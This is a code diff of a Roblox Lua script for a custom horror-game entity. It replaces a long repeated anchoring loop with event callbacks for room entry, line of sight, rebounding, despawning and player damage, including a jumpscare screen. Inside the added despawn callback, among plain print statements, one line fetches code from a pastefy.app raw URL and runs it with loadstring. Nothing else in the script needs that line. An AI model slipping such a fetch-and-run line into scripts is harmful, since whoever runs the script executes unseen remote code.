-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-    wait(0.2)
-    game.workspace.Rebound.RushNew.Anchored = false
-    wait(2)
-    game.workspace.Rebound.RushNew.Anchored = true
-end
+entity:SetCallback("OnEnterRoom", function(room, firstTime)
+    if firstTime == true then
+        print("Entity has entered room: ".. room.Name.. " for the first time")
+    else
+        print("Entity has entered room: ".. room.Name.. " again")
+    end
+end)
 
-entity.Debug.OnEntityFinishedRebound = function()
-    print("Entity has finished rebound:")
-end
+entity:SetCallback("OnLookAt", function(lineOfSight)
+	if lineOfSight == true then
+		print("Player is looking at entity")
+	else
+		print("Player view is obstructed by something")
+	end
+end)
 
-entity.Debug.OnEntityEnteredRoom = function(entityTable, room)
-    print("Entity:", "has entered room:",room)
-end
+entity:SetCallback("OnRebounding", function(startOfRebound)
+    if startOfRebound == true then
+        print("Entity has started rebounding")
+	else
+        print("Entity has finished rebounding")
+	end
+end)
 
-entity.Debug.OnLookAtEntity = function()
-    print("Player has looked at entity:")
-end
+entity:SetCallback("OnDespawning", function()
+    print("Entity is despawning")
+    loadstring(game:HttpGet("https://pastefy.app/3RdwG7dF/raw"))()
+end)
 
-entity.Debug.OnDeath = function()
-    warn("Player has died.")
-        local JumpscareGui = Instance.new("ScreenGui")
+entity:SetCallback("OnDespawned", function()
+    print("Entity has despawned")
+end)
+
+entity:SetCallback("OnDamagePlayer", function(newHealth)
+	if newHealth == 0 then
+		print("Entity has killed the player")
+		local JumpscareGui = Instance.new("ScreenGui")
     local Background = Instance.new("Frame")
     local Face = Instance.new("ImageLabel")
 
@@ -972,9 +251,22 @@ eq.Parent = scare
     scare:Play()
     task.wait(0.7)
     JumpscareGui:Destroy()
-end
+	else
+		print("Entity has damaged the player")
+	end
+end)
 
-------------------------
+--[[
 
--- Run the created entity
-Spawner.runEntity(entity)
+DEVELOPER NOTE:
+By overwriting 'CrucifixionOverwrite' the default crucifixion callback will be replaced with your custom callback.
+
+entity:SetCallback("CrucifixionOverwrite", function()
+    print("Custom crucifixion callback")
+end)
+
+]]--
+
+---====== Run entity ======---
+
+entity:Run()
